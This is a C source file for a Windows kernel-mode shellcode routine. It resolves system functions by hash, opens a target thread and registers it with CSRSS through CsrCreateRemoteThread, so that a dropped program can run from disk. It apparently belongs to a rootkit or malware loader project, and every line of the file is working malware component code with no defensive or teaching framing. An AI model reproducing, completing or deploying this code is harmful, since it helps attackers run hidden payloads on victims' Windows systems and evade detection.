#include <ntifs.h>
#include <wdm.h>
#include <ntstrsafe.h>

#include "../../../../../../shared/types.h"

#include "../../../zshellcode.h"

#define CsrCreateRemoteThread_Hash 0x396A799F
typedef NTSTATUS (*FnCsrCreateRemoteThread)(void* hThread, PCLIENT_ID ClientId);

#define NtOpenThread_Hash 0x779AD3C2
typedef NTSTATUS (*FnNtOpenThread)(void**, unsigned long, POBJECT_ATTRIBUTES, PCLIENT_ID);

#define NtClose_Hash 0x9292A4AE
typedef NTSTATUS (*FnNtClose)(void*);

#define INVALID_HANDLE_VALUE ((HANDLE)(LONG_PTR)-1)

#define PROCESS_TERMINATE                  (0x0001)  
#define PROCESS_CREATE_THREAD              (0x0002)  
#define PROCESS_SET_SESSIONID              (0x0004)  
#define PROCESS_VM_OPERATION               (0x0008)  
#define PROCESS_VM_READ                    (0x0010)  
#define PROCESS_VM_WRITE                   (0x0020)  
#define PROCESS_DUP_HANDLE                 (0x0040)  
#define PROCESS_CREATE_PROCESS             (0x0080)  
#define PROCESS_SET_QUOTA                  (0x0100)  
#define PROCESS_SET_INFORMATION            (0x0200)  
#define PROCESS_QUERY_INFORMATION          (0x0400)  
#define PROCESS_SUSPEND_RESUME             (0x0800)  
#define PROCESS_QUERY_LIMITED_INFORMATION  (0x1000) 

#define STATUS_WAIT_0 ((NTSTATUS)0x00000000L) 
#define WAIT_OBJECT_0       ((STATUS_WAIT_0 ) + 0 )

#ifdef _WIN64
VOID shellcode_exe_disk(pshellcode64_block_t pScBlock/*, pvoid_t sysArg1, pvoid_t sysArg2*/)
#else
VOID shellcode_exe_disk(pshellcode_block_t pScBlock/*, pvoid_t sysArg1, pvoid_t sysArg2*/)
#endif // _WIN64
{
    uint8_t* csrsrvBase = NULL;
    uint8_t* ntdllBase = NULL;
    FnCsrCreateRemoteThread fnCsrCreateRemoteThread;
    FnNtOpenThread fnNtOpenThread;
    FnNtClose fnNtClose;
    FnNtTerminateThread fnNtTerminateThread;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    OBJECT_ATTRIBUTES objAttrs;
    HANDLE hThread;

    do {
        csrsrvBase = ((FnGetNtDLLBase)pScBlock->fnGetNtDLLBase)(CSRSRV_DLL_HASH);
        ntdllBase = ((FnGetNtDLLBase)pScBlock->fnGetNtDLLBase)(NTDLL_DLL_HASH);

        fnNtTerminateThread = ((FnGetFuncAddress)pScBlock->fnGetFuncAddress)(ntdllBase, NtTerminateThread_Hash);
        fnCsrCreateRemoteThread = ((FnGetFuncAddress)pScBlock->fnGetFuncAddress)(csrsrvBase, CsrCreateRemoteThread_Hash);
        fnNtOpenThread = ((FnGetFuncAddress)pScBlock->fnGetFuncAddress)(ntdllBase, NtOpenThread_Hash);
        fnNtClose = ((FnGetFuncAddress)pScBlock->fnGetFuncAddress)(ntdllBase, NtClose_Hash);

        InitializeObjectAttributes(&objAttrs, NULL, 0, NULL, NULL);

        Status = fnNtOpenThread(&hThread, THREAD_ALL_ACCESS, &objAttrs, (PCLIENT_ID)pScBlock->inData);
        if (Status == STATUS_SUCCESS) {
            Status = fnCsrCreateRemoteThread(hThread, (PCLIENT_ID)pScBlock->inData);

            fnNtClose(hThread);
        }
    } while(0);

    pScBlock->result = (Status == STATUS_SUCCESS ? SC_RESULT_OK : SC_RESULT_BAD);

    fnNtTerminateThread(0, Status);
}
